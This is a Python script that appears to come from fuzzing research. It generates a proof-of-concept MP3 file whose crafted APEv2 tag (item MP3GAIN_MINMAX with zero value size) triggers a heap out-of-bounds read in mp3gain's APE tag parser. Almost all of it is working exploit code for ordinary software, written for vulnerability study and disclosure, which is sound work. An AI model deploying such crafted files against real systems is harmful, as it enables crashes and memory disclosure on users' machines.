#!/usr/bin/env python3
"""
PoC Generator for VULN 002: Heap OOB Read in MP3GAIN_MINMAX APE Field Parsing

Vulnerability: ReadMP3APETag() in apetag.c lines 243-253
  - When APE item has name="MP3GAIN_MINMAX" and vsize=0:
    - malloc(vsize+1) = malloc(1) -> 1-byte value buffer
    - line 247: memcpy(tmpString, vp, 3)  -> reads 3 bytes from 1-byte buffer (OOB +2)
    - line 251: memcpy(tmpString, vp, 3)  -> vp=value+4, reads 3 bytes (OOB +7)

Trigger: APE tag at end of file with item name="MP3GAIN_MINMAX", item_value_size=0
"""

import struct
import os

output_path = "/data/ylwang/non-textfuzz/target/_poc/mp3gain/apetag_c/vuln_002.mp3"
os.makedirs(os.path.dirname(output_path), exist_ok=True)

# ---------------------------------------------------------------------------
# Minimal fake MP3 frame header so mp3gain opens the file
# MPEG1 Layer3 128kbps 44100Hz mono, frame size = 417 bytes
# ---------------------------------------------------------------------------
mp3_frame_header = b'\xff\xfb\x90\xc0'          # sync + MPEG1 + L3 + 128k + 44.1k + mono
mp3_frame_body   = b'\x00' * (417 - 4)           # 413 zero bytes of "audio data"
mp3_data = mp3_frame_header + mp3_frame_body      # 417 bytes total

# ---------------------------------------------------------------------------
# Malicious APE item: name="MP3GAIN_MINMAX", vsize=0
# ---------------------------------------------------------------------------
# Item layout: item_value_size(4B LE) + item_flags(4B LE) + key(null-term) + value(vsize bytes)
item_value_size = 0          # vsize=0 -> value buffer is malloc(1), only 1 valid byte
item_flags      = 0          # UTF-8 text item type
item_key        = b"MP3GAIN_MINMAX\x00"   # 15 bytes (14 chars + NUL)
item_value      = b""        # 0 bytes (empty value)

item = struct.pack("<II", item_value_size, item_flags) + item_key + item_value
item_bytes = len(item)       # 4 + 4 + 15 + 0 = 23 bytes

# ---------------------------------------------------------------------------
# APEv2 footer (32 bytes, footer-only, no header)
# ---------------------------------------------------------------------------
# Flag bits: bit31=0 (no header), bit30=0 (this is footer), bit29=0 (not read-only)
ape_version = 2000           # APEv2
ape_size    = item_bytes + 32  # size field = items_total + footer_size
ape_count   = 1              # one item
ape_flags   = 0x00000000    # footer-only tag

footer = (
    b"APETAGEX" +
    struct.pack("<IIII", ape_version, ape_size, ape_count, ape_flags) +
    b"\x00" * 8             # reserved
)
assert len(footer) == 32, f"Footer must be 32 bytes, got {len(footer)}"

# ---------------------------------------------------------------------------
# Assemble file: [MP3 frame] [APE item] [APE footer]
# ---------------------------------------------------------------------------
file_data = mp3_data + item + footer

with open(output_path, "wb") as f:
    f.write(file_data)

file_size = len(file_data)
print(f"Generated: {output_path} ({file_size} bytes)")
print(f"  MP3 frame : {len(mp3_data)} bytes")
print(f"  APE item  : {item_bytes} bytes  (name=MP3GAIN_MINMAX, vsize={item_value_size})")
print(f"  APE footer: {len(footer)} bytes  (size_field={ape_size}, count={ape_count})")
print()
print("Expected trigger path:")
print("  ReadMP3APETag: value = malloc(1)  -> 1-byte buffer")
print("  line 247: memcpy(tmpString, vp, 3) -> OOB read +2 bytes past allocation")
print("  line 251: memcpy(tmpString, vp, 3) -> OOB read +7 bytes past allocation")
